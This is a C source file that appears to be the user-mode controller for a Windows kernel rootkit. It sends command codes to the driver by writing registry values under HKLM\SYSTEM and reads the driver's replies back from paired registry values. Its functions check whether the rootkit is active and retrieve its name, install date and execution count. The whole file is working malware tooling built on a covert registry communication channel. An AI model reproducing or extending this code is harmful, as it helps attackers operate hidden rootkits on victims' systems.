#include "stdafx.h"
#include "util.h"

void colorPrint(WORD color, char* str, DWORD param);


int getOut(int code, WORD color, char* str) {
	colorPrint(color, " %s\n", (DWORD)str);
	colorPrint(WHITE, " Press any key to exit...\n", NULL);
	getchar();
	exit(1);
}


int sendNoBufferCommand(wchar_t* str_tid, DWORD command, LPCSTR message, WORD color) {
	LSTATUS status;
	HKEY   hKey;
	status = RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM", &hKey);
	if (status != ERROR_SUCCESS) {
		printf("There was an error opening key!\nStatus is %d\n", status);
		Sleep(2000);
		return 0;
	}
	if (message)
		colorPrint(color, "%s\n", (DWORD)message);
	
	return RegSetValueEx(hKey, str_tid, 0, REG_BINARY, (const BYTE*)&command, 0x4);

}



int receiveOutputFromCommand(wchar_t* str_tid, LPCSTR message, char* outputBuffer, int* size) {
	LSTATUS status;
	HKEY   hKey;
	wchar_t outputKey[6];
	DWORD typeOutputBuffer;

	memset(outputBuffer, NULL, *size);
	swprintf(outputKey, 6, L"o%ls", str_tid);

	if (message)
		printf("%s\n", message);

	status = RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM", &hKey);
	if (status != ERROR_SUCCESS) {
		printf("There was an error opening key!\nStatus is %d\n", status);
		return status;
	}
	

	return RegQueryValueExW(hKey, outputKey, 0, &typeOutputBuffer, (BYTE*)outputBuffer, (LPDWORD)size);

}

BOOL checkRk(wchar_t* str_tid) {
	DWORD commandCheckRk = 0x0022C008;
	LSTATUS status;

	char outputBuffer;
	int size = 1;
	sendNoBufferCommand(str_tid, commandCheckRk, NULL,NULL);
	status = receiveOutputFromCommand(str_tid, NULL, &outputBuffer, &size);
	if (status == ERROR_SUCCESS && size > 0) {
		return outputBuffer == 0x1 && size == 1;
	}

	return FALSE;
}


BOOL getRkInfo(wchar_t* str_tid, RK_INFO_S* info) {
	DWORD commandRkInfo = 0x00224014;
	DWORD* dwLowDateTime;
	DWORD* dwHighDateTime;
	LSTATUS status;

	char outputBuffer[BUFFERSIZE];
	int size = BUFFERSIZE;
	sendNoBufferCommand(str_tid, commandRkInfo, " Requesting Driver Info",WHITE);
	status = receiveOutputFromCommand(str_tid, NULL, outputBuffer, &size);
	if (status == ERROR_SUCCESS && size > 0) {
		dwLowDateTime = (DWORD*)(outputBuffer + 8);
		dwHighDateTime = (DWORD*)(outputBuffer + 12);
		info->installDate.dwLowDateTime = *(dwLowDateTime);
		info->installDate.dwHighDateTime = *(dwHighDateTime);

		info->execNumber = *(outputBuffer + 16);
		wmemcpy(info->nameRootkit, (wchar_t*)(outputBuffer + 20), 16);
		info->isActive = *(outputBuffer + 68);
		return TRUE;
	}

	return FALSE;
}